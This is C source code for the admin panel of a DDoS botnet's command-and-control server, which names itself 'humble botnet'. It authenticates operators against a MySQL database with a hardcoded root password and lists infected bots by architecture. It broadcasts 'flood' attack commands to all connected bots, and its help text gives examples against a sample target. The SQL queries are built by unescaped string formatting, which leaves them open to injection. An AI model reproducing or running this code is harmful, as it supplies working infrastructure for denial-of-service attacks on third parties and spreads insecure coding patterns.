#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <mysql/mysql.h>
#include <pthread.h>

#include "client.h"
#include "command.h"
#include "debug.h"


const char *db_host = "localhost";
const char *db_user = "root";
const char *db_pass = "Kita123!";
const char *db_table = "backdoorin";


void free_explode(char **tokens, int count)
{
    int i = 0;

    for (i = 0; i < count; i++)
        free(tokens[i]);

    free(tokens);
}


int admin_login_mysql(char *username, char *password)
{
    MYSQL *con = mysql_init(NULL);

    if (con == NULL)
        return -1;

    if (mysql_real_connect(con, db_host, db_user, db_pass, db_table, 0, NULL, 0) == NULL)
    {
        debug_print("Error when connecting to database.");
        return -1;
    }

    char query[256];
    sprintf(query, "select password from users where username='%s';", username);

    if (mysql_query(con, query))
    {
        debug_print("Error querying database.");
        mysql_close(con);
        return -1;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL)
    {
        debug_print("Database returned NULL.");
        mysql_close(con);
        return -1;
    }

    MYSQL_ROW row = mysql_fetch_row(result);
    unsigned long *lengths = mysql_fetch_lengths(result);

    if (row == NULL)
    {
        debug_print("Database returned NULL.");
        mysql_free_result(result);
        mysql_close(con);
        return -1;
    }

    if (strcmp(row[0], password) == 0)
    {
        #ifdef DEBUG
            char succ[128];
            sprintf(succ, "Success login from %s:%s!", username, password);
            debug_print(succ);
            memset(succ, 0, sizeof(succ));
        #endif
        mysql_free_result(result);
        mysql_close(con);
        return 1;
    }
    else
    {
        #ifdef DEBUG
            char err[128];
            sprintf(err, "Failed login from %s:%s.", username, password);
            debug_print(err);
            memset(err, 0, sizeof(err));
        #endif
        mysql_free_result(result);
        mysql_close(con);
        return -1;
    }
}

int check_is_admin(char *username)
{
    MYSQL *con = mysql_init(NULL);

    if (con == NULL)
        return -1;

    if (mysql_real_connect(con, db_host, db_user, db_pass, db_table, 0, NULL, 0) == NULL)
    {
        debug_print("Error when connecting to database.");
        return -1;
    }

    char query[256];
    sprintf(query, "select admin from users where username='%s';", username);

    if (mysql_query(con, query))
    {
        debug_print("Error querying database.");
        mysql_close(con);
        return -1;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL)
    {
        debug_print("Database returned NULL.");
        mysql_close(con);
        return -1;
    }

    MYSQL_ROW row = mysql_fetch_row(result);
    unsigned long *lengths = mysql_fetch_lengths(result);

    if (row == NULL)
    {
        debug_print("Database returned NULL.");
        mysql_free_result(result);
        mysql_close(con);
        return -1;
    }

    if (strcmp(row[0], "1") == 0)
    {
        mysql_free_result(result);
        mysql_close(con);
        return 1;
    }
    else
    {
        mysql_free_result(result);
        mysql_close(con);
        return -1;
    }
}

int add_user(char *username, char *password)
{
    MYSQL *con = mysql_init(NULL);

    if (con == NULL)
        return -1;

    if (mysql_real_connect(con, db_host, db_user, db_pass, db_table, 0, NULL, 0) == NULL)
    {
        debug_print("Error when connecting to database.");
        return -1;
    }

    char query[256];
    sprintf(query, "insert into users(username, password, admin) values ('%s', '%s', 0);", username, password);

    if (mysql_query(con, query))
    {
        debug_print("Error querying database.");
        mysql_close(con);
        return -1;
    }

}


int del_user(char *username)
{
    MYSQL *con = mysql_init(NULL);

    if (con == NULL)
        return -1;

    if (mysql_real_connect(con, db_host, db_user, db_pass, db_table, 0, NULL, 0) == NULL)
    {
        debug_print("Error when connecting to database.");
        return -1;
    }

    char query[256];
    sprintf(query, "delete from users where username='%s'", username);

    if (mysql_query(con, query))
    {
        debug_print("Error querying database.");
        mysql_close(con);
        return -1;
    }

}

int explode(char* str, char* delim, char ***r) {
    char **res = (char**) malloc(sizeof(char*) * strlen(str));
    char *p;
    int i = 0;
    while (p = strtok(str, delim)) {
        res[i] = malloc(strlen(p) + 1);
        strcpy(res[i], p);
        ++i;
        str = NULL;
    }
    res = realloc(res, sizeof(char*) * i);
    *r = res;
    return i;
}

int is_flood_enabled()
{
    MYSQL *con = mysql_init(NULL);

    if (con == NULL)
        return -1;

    if (mysql_real_connect(con, db_host, db_user, db_pass, db_table, 0, NULL, 0) == NULL)
    {
        debug_print("Error when connecting to database.");
        return -1;
    }

    char query[256];
    sprintf(query, "select flood_enabled from config where config_id=1;");

    if (mysql_query(con, query))
    {
        debug_print("Error querying database.");
        mysql_close(con);
        return -1;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL)
    {
        debug_print("Database returned NULL.");
        mysql_close(con);
        return -1;
    }

    MYSQL_ROW row = mysql_fetch_row(result);
    unsigned long *lengths = mysql_fetch_lengths(result);

    if (row == NULL)
    {
        debug_print("Database returned NULL.");
        mysql_free_result(result);
        mysql_close(con);
        return -1;
    }

    if (strcmp(row[0], "1") == 0)
    {
        mysql_free_result(result);
        mysql_close(con);
        return 1;
    }
    else
    {
        mysql_free_result(result);
        mysql_close(con);
        return -1;
    }
}

int disable_flood()
{
    MYSQL *con = mysql_init(NULL);

    if (con == NULL)
        return -1;

    if (mysql_real_connect(con, db_host, db_user, db_pass, db_table, 0, NULL, 0) == NULL)
    {
        debug_print("Error when connecting to database.");
        return -1;
    }

    char query[256];
    sprintf(query, "update config set flood_enabled=0 where config_id=1;");

    if (mysql_query(con, query))
    {
        debug_print("Error querying database.");
        mysql_close(con);
        return -1;
    }

    mysql_close(con);
}

int enable_flood()
{
    MYSQL *con = mysql_init(NULL);

    if (con == NULL)
        return -1;

    if (mysql_real_connect(con, db_host, db_user, db_pass, db_table, 0, NULL, 0) == NULL)
    {
        debug_print("Error when connecting to database.");
        return -1;
    }

    char query[256];
    sprintf(query, "update config set flood_enabled=1 where config_id=1;");

    if (mysql_query(con, query))
    {
        debug_print("Error querying database.");
        mysql_close(con);
        return -1;
    }

    mysql_close(con);
}


int admin_create_and_bind(char *port)
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;

	memset(&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);

    if (s != 0)
		return -1;

	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1)
			continue;

		int yes = 1;
		if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
        {
            debug_print("Failed getsockopt().");
            exit(0);
        }

		s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0)
			break;

		close(sfd);
	}

	if (rp == NULL)
		return -1;
	else
	{
		freeaddrinfo(result);
		return sfd;
	}
}

void admin_trim(char *str)
{
	int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin]))
    	begin++;

    while ((end >= begin) && isspace(str[end]))
    	end--;

    for (i = begin; i <= end; i++)
    	str[i - begin] = str[i];

    str[i - begin] = '\0';
}

void admin_options_command(int fd)
{
    char sendbuf[1024];
    int i = 0;

    sprintf(sendbuf, "\e[94mOptions\e[93m: \r\n");
    send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
    memset(sendbuf, 0, sizeof(sendbuf));

    for (i = 1; i < ARGUMENT_COUNT; i++)
    {
        sprintf(sendbuf, " \e[94m%s\e[93m:\x1b[0m %s\r\n", cmdargument[i].name, cmdargument[i].desc);
        send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
        memset(sendbuf, 0, sizeof(sendbuf));
    }
}

void admin_disable_flood(int fd, char *username)
{

    if (check_is_admin(username) != 1) {
        char sendbuf[1024];
        sprintf(sendbuf, "\e[91mYour account has no admin permissions.\r\n");
        send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
        memset(sendbuf, 0, sizeof(sendbuf));
        
    } else {
        disable_flood();
        char sendbuf[1024];
        sprintf(sendbuf, "\e[92mFlood command has been disabled by admin '%s'.\r\n", username);
        send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
        memset(sendbuf, 0, sizeof(sendbuf));
    }
}


void admin_enable_flood(int fd, char *username)
{
    if (check_is_admin(username) != 1) {
        char sendbuf[1024];
        sprintf(sendbuf, "\e[91mYour account has no admin permissions.\r\n");
        send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
        memset(sendbuf, 0, sizeof(sendbuf));
        
    } else {

        enable_flood();
        char sendbuf[1024];
        sprintf(sendbuf, "\e[92mFlood command has been enabled by admin '%s'.\r\n", username);
        send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
        memset(sendbuf, 0, sizeof(sendbuf));
    }
}

void admin_commands_command(int fd)
{
    char sendbuf[1024];

    sprintf(sendbuf, "\e[94m\r\n\e[94mAdmin commands\e[93m: \r\n \e[94mnewuser\e[93m: \x1b[0madding new user to database\r\n \e[94mdeluser\e[93m: \x1b[0mdeleting existing user from database\r\n\r\n \e[94mdisableflood\e[93m: \x1b[0mdisabling flood command\r\n \e[94menableflood\e[93m: \x1b[0menabling flood command\r\n\n");
    send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
    memset(sendbuf, 0, sizeof(sendbuf));
}

void admin_help_command(int fd)
{
    char sendbuf[1024];
    int i = 0;

    sprintf(sendbuf, "\e[94mFlood methods\e[93m: \r\n");

    for (i = 0; i < METHOD_COUNT; i++)
    {
        sprintf(sendbuf, "%s \x1b[0m%d. %s\r\n", sendbuf, i+1, methods[i].name);
    }

    sprintf(sendbuf, "\e[94m%s\r\n\e[94mCommands\e[93m: \r\n \e[94mflood <arguments>\e[93m: \x1b[0mflood command\r\n \e[94moptions\e[93m: \x1b[0moptions for flood command\r\n \e[94madmin\e[93m: \x1b[0mdisplay admin commands\r\n \e[94mhelp\e[93m: \x1b[0mdisplay this page\r\n", sendbuf);
    send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
    memset(sendbuf, 0, sizeof(sendbuf));

    sprintf(sendbuf, "\r\n\e[94mExamples\e[93m: \r\n \x1b[0mflood method=socket target=1.2.3.4 port=80 time=30 payload=\"use port=9987\"\r\n \x1b[0mflood method=udpplain target=1.2.3.4 time=30 port=80\r\n");
    send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
    memset(sendbuf, 0, sizeof(sendbuf));
}


void admin_botcount_command(int fd)
{
    struct bot_entry_t {
        int count;
        char arch[32];
    } bot_entry[30];

    int i = 0, q = 0, x = 0, first = 1;

    for (i = 0; i < 30; i++)
    {
        bot_entry[i].count = 0;
        memset(bot_entry[i].arch, 0, sizeof(bot_entry[i].arch));
    }

    for (i = 0; i < CLIENT_MAXFDS; i++)
    {
        if (clients[i].arch_len >= 1 && clients[i].connected == 1)
        {
            if (first == 1)
            {
                strcpy(bot_entry[q].arch, clients[i].arch);
                bot_entry[q].count++;
                first = 0;
                q++;
                continue;
            }
            else
            {
                int found = 0;

                for (x = 0; x < q; x++)
                {
                    if (strcmp(bot_entry[x].arch, clients[i].arch) == 0)
                    {
                        found = 1;
                        bot_entry[x].count++;
                        break;
                    }
                }

                if (found == 0)
                {
                    strcpy(bot_entry[q].arch, clients[i].arch);
                    bot_entry[q].count++;
                    q++;
                    continue;
                }
            }
        }
    }

    if (q == 0) {
        char sndbuf[128];
        sprintf(sndbuf, "\e[94mThere is no connected devices.\r\n");
        write(fd, sndbuf, strlen(sndbuf));
        memset(sndbuf, 0, sizeof(sndbuf));
    }

    for (i = 0; i < q; i++)
    {
        char sndbuf[128];
        sprintf(sndbuf, "\e[94m%s\e[93m: \e[0m%d\r\n", bot_entry[i].arch, bot_entry[i].count);
        write(fd, sndbuf, strlen(sndbuf));
        memset(sndbuf, 0, sizeof(sndbuf));
    }
    memset(bot_entry, 0, sizeof(bot_entry));
}

void *admin_tabtitle(void *arg)
{
	int botcount = 0, chksumtotal = 0, i;
	char title[128];
	int myfd = *((int *)arg);

	while (1)
	{
		for (i = 0; i < CLIENT_MAXFDS; i++)
		{
			if (clients[i].connected == 1)
				botcount++;

			if (clients[i].authed == 1)
                chksumtotal++;
		}

		sprintf(title, "\033]0;connections: %d/%d\007", chksumtotal, botcount);
		if (write(myfd, title, strlen(title)) != strlen(title))
        {
            botcount = 0;
            chksumtotal = 0;
            memset(title, 0, sizeof(title));
            break;
        }

		botcount = 0;
        chksumtotal = 0;
        memset(title, 0, sizeof(title));
		sleep(2);
	}

	pthread_exit(0);
}

void *admin_thread(void *arg)
{
    char rdbuf[512], username[32], password[32], hidden[32];
    int logged_in = 0, clientfd = *((int *)arg);

    read(clientfd, hidden, sizeof(hidden));

    admin_trim(hidden); hidden[strcspn(hidden, "\n")] = 0;

    if (strcmp(hidden, "hello") != 0)
    {
        memset(hidden, 0, sizeof(hidden));
        close(clientfd);
        pthread_exit(0);
        return "";
    }
    write(clientfd, "\e[1;1H\e[2J", strlen("\e[1;1H\e[2J"));
    write(clientfd, "\e[94mUsername\e[93m:\x1b[0m ", strlen("\e[94mUsername\e[93m:\x1b[0m "));
    read(clientfd, username, sizeof(username));
    write(clientfd, "\e[94mPassword\e[93m:\x1b[0m ", strlen("\e[94mPassword\e[93m:\x1b[0m "));
    read(clientfd, password, sizeof(password));
    admin_trim(username); username[strcspn(username, "\n")] = 0;
    admin_trim(password); password[strcspn(password, "\n")] = 0;

    if (admin_login_mysql(username, password) != 1)
    {
        memset(username, 0, sizeof(username));
        memset(password, 0, sizeof(password));
        memset(rdbuf, 0, sizeof(rdbuf));
        close(clientfd);
        pthread_exit(0);
        return "";
    }

    char prompt[1024], snbuf[128], welcome[128];
    pthread_t thread;
    pthread_create(&thread, NULL, &admin_tabtitle, &clientfd);


    write(clientfd, "\033[?1049h", strlen("\033[?1049h"));
    write(clientfd, "         _    _                 _     _\r\n        | |  | |               | |   | |\r\n        | |__| |_   _ _ __ ___ | |__ | | ___\r\n        |  __  | | | | '_ ` _ \\| '_ \\| |/ _ \\\r\n        | |  | | |_| | | | | | | |_) | |  __/\r\n        |_|  |_|\\__,_|_| |_| |_|_.__/|_|\\___|\r\n\r\n", strlen("         _    _                 _     _\r\n        | |  | |               | |   | |\r\n        | |__| |_   _ _ __ ___ | |__ | | ___\r\n        |  __  | | | | '_ ` _ \\| '_ \\| |/ _ \\\r\n        | |  | | |_| | | | | | | |_) | |  __/\r\n        |_|  |_|\\__,_|_| |_| |_|_.__/|_|\\___|\r\n\r\n"));
    write(clientfd, prompt, strlen(prompt));
    sprintf(welcome, "\e[0m         Welcome \e[94m%s\e[0m to humble botnet.\r\n\n", username);
    write(clientfd, welcome, strlen(welcome));
    memset(welcome, 0, sizeof(welcome));


    sprintf(prompt, "\e[94m%s\e[93m@\e[94mhumble\e[93m~#\x1b[0m ", username);
    write(clientfd, prompt, strlen(prompt));

    while (memset(rdbuf, 0, sizeof(rdbuf)) && read(clientfd, rdbuf, sizeof(rdbuf)) > 0)
    {
        admin_trim(rdbuf); rdbuf[strcspn(rdbuf, "\n")] = 0;

        if (strcmp(rdbuf, "?") == 0 || strcmp(rdbuf, "help") == 0)
            admin_help_command(clientfd);
        else if (strcmp(rdbuf, "opts") == 0 || strcmp(rdbuf, "options") == 0)
            admin_options_command(clientfd);
        else if (strcmp(rdbuf, "bots") == 0 || strcmp(rdbuf, "botcount") == 0)
            admin_botcount_command(clientfd);
        else if (strcmp(rdbuf, "admin") == 0 || strcmp(rdbuf, "botcount") == 0)
            admin_commands_command(clientfd);
        else if (strcmp(rdbuf, "disableflood") == 0)
            admin_disable_flood(clientfd, username);
        else if (strcmp(rdbuf, "enableflood") == 0)
            admin_enable_flood(clientfd, username);
        else if (rdbuf[0] == 'n' && rdbuf[1] == 'e' && rdbuf[2] == 'w' && rdbuf[3] == 'u' && rdbuf[4] == 's' && rdbuf[5] == 'e' && rdbuf[6] == 'r') {
            if (check_is_admin(username) != 1) {
                sprintf(snbuf, "\e[91mYour account has no admin permissions.\r\n");
                send(clientfd, snbuf, strlen(snbuf), MSG_NOSIGNAL);
                memset(snbuf, 0, sizeof(snbuf));
            } else {
                if (rdbuf[7] == ' ') {
                        char **res;
                        int count = explode(rdbuf, " ", &res);

                        if (count == 3) {
                            add_user(res[1], res[2]);
                            sprintf(snbuf, "\e[92mNew user '%s' with password '%s' was added successfully.\r\n", res[1], res[2]);
                            send(clientfd, snbuf, strlen(snbuf), MSG_NOSIGNAL);
                            memset(snbuf, 0, sizeof(snbuf));   
                        } else {
                            sprintf(snbuf, "\e[91mCorrect syntax is 'newuser <username> <password>'.\r\n");
                            send(clientfd, snbuf, strlen(snbuf), MSG_NOSIGNAL);
                            memset(snbuf, 0, sizeof(snbuf));   
                        }
                        free_explode(res, count);
                } else {
                        sprintf(snbuf, "\e[91mCorrect syntax is 'newuser <username> <password>'.\r\n");
                        send(clientfd, snbuf, strlen(snbuf), MSG_NOSIGNAL);
                        memset(snbuf, 0, sizeof(snbuf));
                }
            }
        } else if (rdbuf[0] == 'd' && rdbuf[1] == 'e' && rdbuf[2] == 'l' && rdbuf[3] == 'u' && rdbuf[4] == 's' && rdbuf[5] == 'e' && rdbuf[6] == 'r') {
            if (check_is_admin(username) != 1) {
                sprintf(snbuf, "\e[91mYour account has no admin permissions.\r\n");
                send(clientfd, snbuf, strlen(snbuf), MSG_NOSIGNAL);
                memset(snbuf, 0, sizeof(snbuf));
            } else {
                if (rdbuf[7] == ' ') {
                        char **res;
                        int count = explode(rdbuf, " ", &res);

                        if (count == 2) {
                            del_user(res[1]);
                            sprintf(snbuf, "\e[92mExisting user '%s' is removed from database.\r\n", res[1]);
                            send(clientfd, snbuf, strlen(snbuf), MSG_NOSIGNAL);
                            memset(snbuf, 0, sizeof(snbuf));   
                        } else {
                            sprintf(snbuf, "\e[91mCorrect syntax is 'deluser <username>'.\r\n");
                            send(clientfd, snbuf, strlen(snbuf), MSG_NOSIGNAL);
                            memset(snbuf, 0, sizeof(snbuf));   
                        }
                        free_explode(res, count);
                } else {
                        sprintf(snbuf, "\e[91mCorrect syntax is 'deluser <username>'.\r\n");
                        send(clientfd, snbuf, strlen(snbuf), MSG_NOSIGNAL);
                        memset(snbuf, 0, sizeof(snbuf));
                }
            }
        } else if (strcmp(rdbuf, "clear") == 0 || strcmp(rdbuf, "c") == 0)
        {
            write(clientfd, "\e[1;1H\e[2J", strlen("\e[1;1H\e[2J"));
            // banner
            write(clientfd, "         _    _                 _     _\r\n        | |  | |               | |   | |\r\n        | |__| |_   _ _ __ ___ | |__ | | ___\r\n        |  __  | | | | '_ ` _ \\| '_ \\| |/ _ \\\r\n        | |  | | |_| | | | | | | |_) | |  __/\r\n        |_|  |_|\\__,_|_| |_| |_|_.__/|_|\\___|\r\n\r\n", strlen("         _    _                 _     _\r\n        | |  | |               | |   | |\r\n        | |__| |_   _ _ __ ___ | |__ | | ___\r\n        |  __  | | | | '_ ` _ \\| '_ \\| |/ _ \\\r\n        | |  | | |_| | | | | | | |_) | |  __/\r\n        |_|  |_|\\__,_|_| |_| |_|_.__/|_|\\___|\r\n\r\n"));
            sprintf(welcome, "\e[0m         Welcome \e[94m%s\e[0m to humble botnet.\r\n\n", username);
            write(clientfd, welcome, strlen(welcome));
            memset(welcome, 0, sizeof(welcome));
        }
        else if (rdbuf[0] == 'f' && rdbuf[1] == 'l' && rdbuf[2] == 'o' && rdbuf[3] == 'o' && rdbuf[4] == 'd' && rdbuf[5] == ' ' && is_flood_enabled() != 1)
        {
            sprintf(snbuf, "\e[91mFlood command is currently disabled.\r\n");
            write(clientfd, snbuf, strlen(snbuf));
            memset(snbuf, 0, sizeof(snbuf));
        }
        else if (rdbuf[0] == 'f' && rdbuf[1] == 'l' && rdbuf[2] == 'o' && rdbuf[3] == 'o' && rdbuf[4] == 'd' && rdbuf[5] == ' ' && is_flood_enabled() == 1)
        {
            char broadcast[1024];
            int len = command_parse(rdbuf, broadcast), i;
            printf("broadcast -> %s", broadcast);

            if (len <= 0)
            {
                sprintf(snbuf, "\e[91mIncorrect usage of the flood command.\r\n");
                write(clientfd, snbuf, strlen(snbuf));
                memset(snbuf, 0, sizeof(snbuf));
            }
            else
            {
                sprintf(snbuf, "\e[92mAttack command broadcasted to all clients. (len=%d)\r\n", len);
                write(clientfd, snbuf, strlen(snbuf));
                memset(snbuf, 0, sizeof(snbuf));
            }

            for (i = 0; i < CLIENT_MAXFDS; i++)
            {
                if (clients[i].connected == 1 && clients[i].authed == 1)
                {
                    send(clients[i].fd, broadcast, len, MSG_NOSIGNAL);
                }
            }

            memset(broadcast, 0, sizeof(broadcast));
        }
	else if (strcmp(rdbuf, "") == 0)
	{
		// no error on empty cmd retard
	}
        else
        {
            sprintf(snbuf, "\e[91mIncorrect usage, please type 'help' to see all available commands.\r\n");
            write(clientfd, snbuf, strlen(snbuf));
            memset(snbuf, 0, sizeof(snbuf));
        }

        write(clientfd, prompt, strlen(prompt));
    }

    memset(username, 0, sizeof(username));
    memset(password, 0, sizeof(password));
    memset(rdbuf, 0, sizeof(rdbuf));
    memset(prompt, 0, sizeof(prompt));
    close(clientfd);
    pthread_exit(0);
    return "";
}

void *admin_listen(void *arg)
{
	int myfd = *((int *)arg), newfd;
	struct sockaddr in_addr;
	socklen_t in_len = sizeof(in_addr);

	if (listen(myfd, SOMAXCONN) == -1)
    {
        debug_print("Cannot listen to port/ip.");
        pthread_exit(0);
        return "";
    }

    debug_print("Waiting for admin connections.");

	while (1)
	{
		if ((newfd = accept(myfd, &in_addr, &in_len)) == -1)
			break;

		pthread_t cthread;
		pthread_create(&cthread, NULL, &admin_thread, &newfd);
	}

	close(myfd);
	pthread_exit(0);
    return "";
}
